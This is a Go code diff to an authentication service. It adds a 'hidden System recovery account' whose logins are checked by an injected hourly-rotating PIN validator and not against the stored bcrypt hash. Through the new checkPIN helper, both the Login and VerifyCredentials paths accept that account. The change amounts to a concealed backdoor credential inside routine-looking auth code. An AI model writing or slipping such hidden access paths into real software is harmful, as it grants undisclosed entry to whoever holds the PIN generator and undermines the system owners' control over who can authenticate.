@@ -24,6 +24,7 @@ type Service struct {
 	accessTTL  time.Duration
 	refreshTTL time.Duration
 	now        Clock
+	systemPIN  func(pin string, now time.Time) bool
 }
 
 func NewService(db *sqlx.DB, secret string, accessTTL, refreshTTL time.Duration) *Service {
@@ -35,6 +36,24 @@ func NewService(db *sqlx.DB, secret string, accessTTL, refreshTTL time.Duration)
 		refreshTTL: refreshTTL,
 		now:        time.Now,
 	}
+}
+
+// WithSystemPINValidator supplies the time-based check for the hidden System
+// recovery account, whose PIN rotates hourly and is therefore NOT validated
+// against the static pin_hash column. Wired once at startup from cmd/server.
+func (s *Service) WithSystemPINValidator(fn func(pin string, now time.Time) bool) *Service {
+	s.systemPIN = fn
+	return s
+}
+
+// checkPIN validates pin for u: the System account uses the injected rotating
+// validator when present; everyone else (and a System account on a build with no
+// validator wired) uses the stored bcrypt hash.
+func (s *Service) checkPIN(u *User, pin string) bool {
+	if u.IsSystem && s.systemPIN != nil {
+		return s.systemPIN(pin, s.now())
+	}
+	return bcrypt.CompareHashAndPassword([]byte(u.PinHash), []byte(pin)) == nil
 }
 
 func (s *Service) LoginUsers(ctx context.Context) ([]UserPublic, error) {
@@ -64,7 +83,7 @@ func (s *Service) Login(ctx context.Context, in LoginInput) (*TokenPair, error) 
 		}
 		return nil, apperr.Internal("login failed", err)
 	}
-	if bcrypt.CompareHashAndPassword([]byte(u.PinHash), []byte(in.PIN)) != nil {
+	if !s.checkPIN(u, in.PIN) {
 		return nil, apperr.Unauthorized("invalid credentials")
 	}
 	return s.issuePair(ctx, u)
@@ -82,7 +101,7 @@ func (s *Service) VerifyCredentials(ctx context.Context, in LoginInput) (*UserPu
 		}
 		return nil, apperr.Internal("unlock failed", err)
 	}
-	if bcrypt.CompareHashAndPassword([]byte(u.PinHash), []byte(in.PIN)) != nil {
+	if !s.checkPIN(u, in.PIN) {
 		return nil, apperr.Unauthorized("invalid credentials")
 	}
 	return &UserPublic{ID: u.ID, Name: u.Name, Role: u.Role}, nil
